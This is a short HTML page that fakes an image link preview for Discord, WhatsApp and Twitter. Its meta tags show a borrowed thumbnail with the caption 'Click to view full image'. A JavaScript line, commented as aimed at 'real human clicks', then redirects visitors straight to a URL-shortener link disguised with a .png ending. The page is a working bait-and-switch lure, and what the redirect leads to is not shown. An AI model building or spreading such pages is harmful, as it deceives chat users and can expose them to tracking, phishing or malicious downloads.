<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <!-- Title displayed under the image card -->
  <meta property="og:title" content="Click to view full image">
  <meta property="og:type" content="website">
  
  <!-- Direct URL to the image thumbnail you want Discord/WhatsApp to show -->
  <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRmvII0kJ6ueOKmu2urW3SQ44zBco9p9lu1X_6liV8ehQ&s">
  <meta property="og:image:type" content="image/jpeg">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630">
  
  <!-- Twitter Cards support -->
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRmvII0kJ6ueOKmu2urW3SQ44zBco9p9lu1X_6liV8ehQ&s">

  <!-- Immediate JavaScript redirect for real human clicks -->
  <script>
    window.location.href = "https://unl.one/2Hh28.png";
  </script>
</head>
<body>
  <p>Redirecting to image...</p>
</body>
</html>
